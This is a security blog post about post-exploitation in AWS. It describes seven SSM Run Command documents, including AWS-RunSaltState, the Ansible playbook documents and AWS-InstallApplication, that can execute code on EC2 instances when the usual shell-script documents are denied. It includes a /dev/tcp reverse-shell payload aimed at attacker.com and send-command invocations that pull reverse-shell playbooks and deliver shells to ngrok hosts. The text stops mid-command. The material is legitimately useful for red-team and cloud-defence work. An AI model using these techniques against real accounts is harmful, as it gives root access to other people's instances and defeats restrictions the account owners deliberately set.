---
title: 7 lesser-known AWS SSM Document techniques for code execution
url: https://securitycafe.ro/2023/04/19/7-lesser-known-aws-ssm-document-techniques-for-code-execution/
source: Security Café
date: 2023-04-20
fetch_date: 2025-10-04T11:34:45.759621
---

# 7 lesser-known AWS SSM Document techniques for code execution

[Skip to content](#content)

[Security Café](https://securitycafe.ro/)

Security Research and Services

* [Things we do on a daily basis](https://securitycafe.ro/security-services-for-business/)
  + [Red Team (DORA/TIBER) exercises](https://securitycafe.ro/security-services-for-business/dora-tiber-exercises/)
  + [Web Application Penetration Testing](https://securitycafe.ro/security-services-for-business/web-application-penetration-testing/)
  + [Mobile Application Penetration Testing](https://securitycafe.ro/security-services-for-business/mobile-application-penetration-testing/)
  + [Infrastructure Penetration Testing](https://securitycafe.ro/security-services-for-business/infrastructure-penetration-testing/)
  + [Vulnerability Assessment](https://securitycafe.ro/security-services-for-business/vulnerability-assessment/)
* [CVEs, Talks and Tools](https://securitycafe.ro/cves-talks-and-tools/)
* [Contact](https://securitycafe.ro/contact/)
* [About](https://securitycafe.ro/about/)

[![](https://securitycafe.ro/wp-content/uploads/2015/01/cropped-cropped-coffee-banner-2-4.jpg)](https://securitycafe.ro/)

![](https://securitycafe.ro/wp-content/uploads/2023/03/7-lesser-known-feature-image.png?w=655)

# 7 lesser-known AWS SSM Document techniques for code execution

[April 19, 2023](https://securitycafe.ro/2023/04/19/7-lesser-known-aws-ssm-document-techniques-for-code-execution/ "9:30 am") [Eduard Agavriloae](https://securitycafe.ro/author/eagavriloae/ "View all posts by Eduard Agavriloae") [aws](https://securitycafe.ro/category/cloud-security/aws/), [Cloud Security](https://securitycafe.ro/category/cloud-security/), [Pentest techniques](https://securitycafe.ro/category/pentest-techniques/) [Leave a comment](https://securitycafe.ro/2023/04/19/7-lesser-known-aws-ssm-document-techniques-for-code-execution/#respond)

A deep dive into AWS SSM Run Command shows that there are multiple documents attackers can use for executing code remotely on EC2 instances. In this article I’ll present you 7 other documents that can be used when AWS-RunShellScript or AWS-RunPowerShellScript are not allowed.

## Introduction

In my previous articles we saw how and what you can do with AWS SSM Run Command using the documents AWS-RunShellScript and AWS-RunPowerShellScript ([AWS ssm:SendCommand or network agnostic built-in RCE as root](https://securitycafe.ro/2023/01/17/aws-post-explitation-with-ssm-sendcommand/) and [EC2StepShell: A Tool for Getting Reverse Shells on Instances with Network Restrictions](https://securitycafe.ro/2023/03/08/ec2stepshell-reverse-shells-private-ec2-instances/)). But what if the ssm:SendCommand is denied on both documents? Put inside a policy, this scenario will look like this:

![](https://securitycafe.ro/wp-content/uploads/2023/03/image-7.png?w=718)

Policy that denies the usage of classic documents used for RCE

The policy above allows us to perform ec2:DescribeInstances and ssm:ListCommandInvocations on all resources, but for ssm:SendCommand we can use it on every resource except the documents AWS-RunShellScript and AWS-RunPowerShellScript.

During my research, I discovered 7 other SSM documents that can be used to execute code remotely using SSM Run Command. The payloads presented can be found in the next repository: <https://github.com/saw-your-packet/fun-with-ssm>.

## 1. AWS-RunSaltState

This document will download from a remote location a Salt state file and interpret it. Salt state files are part of SaltStack, a technology for infrastructure management. The file format is YAML and the AWS-RunSaltState document can download it from S3 Buckets or HTTP(S) servers.

The payload for running arbitrary code will use “cmd.run”, as exemplified below where we have a payload for getting a reverse shell.

```
mycommand:
  cmd.run:
    - name: 0<&196;exec 196<>/dev/tcp/attacker.com/1337; sh <&196 >&196 2>&196
```

The downside is that Salt Stack needs to be installed on the target system and that’s not the case by default.

For this document, as well as for the rest of them, we can create parameterized payloads. Meaning that we will use a single generic payload and pass the host and port as parameters.

Improved Salt state file:

![](https://securitycafe.ro/wp-content/uploads/2023/03/image-9.png?w=840)

<https://github.com/saw-your-packet/fun-with-ssm/blob/main/AWS-RunSaltState/linux/reverse_shell.yml>

Example usage:

```
aws ssm send-command --document-name AWS-RunSaltState \
	--instance-id i-06ae9883fe6e5d721 \
	--parameters \
'{"stateurl":["https://raw.githubusercontent.com/saw-your-packet/fun-with-ssm/main/AWS-RunSaltState/linux/reverse_shell.yml"], "pillars":["{\"host\":\"7.tcp.eu.ngrok.io\", \"port\":\"14460\"}"]}'
```

Result:

![](https://securitycafe.ro/wp-content/uploads/2023/03/image-11.png?w=1024)

Reverse shell using parameterized payload – AWS-RunSaltState

As you can see, we are running as root, just as we were when executing commands with AWS-RunShellScript or AWS-RunPowerShellScript.

## 2. AWS-ApplyAnsiblePlaybooks

It downloads from remote locations Ansible Playbooks and executes them. It can download from S3 Buckets or GitHub repositories.

The advantage here is that it can also install Ansible on the system.

The parameterized Ansible Playbook for getting a reverse shell:

![](https://securitycafe.ro/wp-content/uploads/2023/03/image-12.png?w=824)

<https://github.com/saw-your-packet/fun-with-ssm/blob/main/AWS-ApplyAnsiblePlaybooks/linux/reverse_shell.yml>

Example usage:

```
aws ssm send-command --instance-id i-0ecad5485f77f18f4 \
	--document-name "AWS-ApplyAnsiblePlaybooks" \
	--parameters \
'{"SourceType":["GitHub"],"SourceInfo":["{\"owner\":\"saw-your-packet\", \"repository\":\"fun-with-ssm\",\"path\":\"AWS-ApplyAnsiblePlaybooks/linux/\", \"getOptions\":\"branch:main\"}"],"InstallDependencies":["True"],"PlaybookFile":["reverse_shell.yml"],"ExtraVariables":["host=6.tcp.eu.ngrok.io port=13012"]}'
```

Because it is a GitHub repository, we have to specify more parameters than an HTTP server. Besides that, the parameters of interest are:

* InstallDependencies
  + Set to `true` for installing Ansible on the system
* ExtraVariables
  + Here we specify the host and port where to receive the reverse shell

![](https://securitycafe.ro/wp-content/uploads/2023/03/picture2.png?w=1024)

Reverse shell using parameterized payload – AWS-ApplyAnsiblePlaybook

## 3. AWS-RunAnsiblePlaybook

It does the same thing as AWS-ApplyAnsiblePlaybook with some differences:

* Can download only from S3 Buckets and HTTP(S) servers
* It requires Ansible to be already installed on the system

The same Ansible Playbook can be used, but the command to send the command is different:

```
aws ssm send-command --document-name "AWS-RunAnsiblePlaybook" \
	--instance-id i-0ecad5485f77f18f4 \
	--parameters \
'{"playbookurl":["https://raw.githubusercontent.com/saw-your-packet/fun-with-ssm/main/AWS-RunAnsiblePlaybook/linux/reverse_shell.yml"],"extravars":["host=7.tcp.eu.ngrok.io port=14355"]}'
```

## 4. AWS-InstallPowerShellModule

It downloads from remote locations PS module and installs them. It only supports HTTP(S) servers.

The way the document is build, it allows you to execute an arbitrary command after the module was installed. Because of this, the PS module doesn’t need to be malicious.

Example usage:

```
aws ssm send-command --document-name "AWS-InstallPowerShellModule" \
    --instance-id i-06ae9883fe6e5d721 \
    --parameters '{"source":["https://your-server.com/module.ps1"], "commands":["whoami"]}’ \
    --region us-east-1
```

## 5. AWS-InstallApplication

It downloads from remote locations MSI files and installs them. It only supports HTTP(S) servers. You can pass arguments to the MSI installation if want to. You need to be aware of AV at this point if the file is malicious.

Example usage:

```
aws ssm send-command --document-name "AWS-InstallApplication" \
    --instance-id i-06ae9883fe6e5d721 \
    --parameters '{"action":["Install"], "parameters":["p...